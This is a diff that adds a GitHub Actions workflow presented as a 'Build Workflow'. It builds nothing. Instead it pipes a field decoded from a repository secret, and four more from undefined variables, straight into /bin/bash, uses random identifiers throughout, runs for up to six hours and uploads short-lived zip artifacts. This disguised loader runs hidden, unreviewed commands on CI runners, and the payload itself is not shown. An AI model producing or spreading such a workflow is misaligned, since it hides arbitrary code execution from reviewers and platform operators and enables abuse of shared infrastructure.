@@ -1,0 +1,30 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  compile:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup and run
+        env:
+          uw274: ${{ secrets.uw274 }}
+        run: |
+          printf '%s' "$uw274" | jq -r .r4 | /bin/bash
+          echo $qhl12 | jq -r .nwdl06 | /bin/bash
+          echo $xwnep6913 | jq -r .d4 | /bin/bash
+          printf '%s' "$e7" | jq -r .gim8 | /bin/bash
+          echo $zxl72 | jq -r .shbo56 | /bin/bash
+
+      - name: Upload data
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: QOds2wRg
+          path: "*.zip"
+          retention-days: 1
